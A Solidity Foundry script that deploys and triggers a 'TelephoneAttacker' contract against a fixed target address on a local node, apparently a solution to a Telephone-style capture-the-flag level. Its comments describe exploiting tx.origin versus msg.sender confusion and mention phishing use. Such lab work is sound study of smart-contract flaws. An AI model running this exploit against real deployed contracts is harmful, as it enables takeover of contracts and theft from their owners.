// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script} from "../lib/forge-std/src/Script.sol";
import {TelephoneAttacker} from "../src/TelephoneAttacker.sol";
import {HelperConfigLib} from "./config/HelperConfig.sol";

contract TelephoneAttackerDeployer is Script {
    function run() external {
        vm.startBroadcast(HelperConfigLib.ATTACKER_KEY);
        TelephoneAttacker attackContract = new TelephoneAttacker(
            0x9467A509DA43CB50EB332187602534991Be1fEa4 // got from contract.address
        );
        attackContract.attack(HelperConfigLib.ATTACKER_ADDRESS);
        vm.stopBroadcast();
    }
}

// forge script ./script/TelephoneAttackerDeployer.s.sol:TelephoneAttackerDeployer --rpc-url http://127.0.0.1:8545 --broadcast -vvv

// ATTACKER will be tx.origin
// attackContract will be msg.sender
// will be used for phishing attack
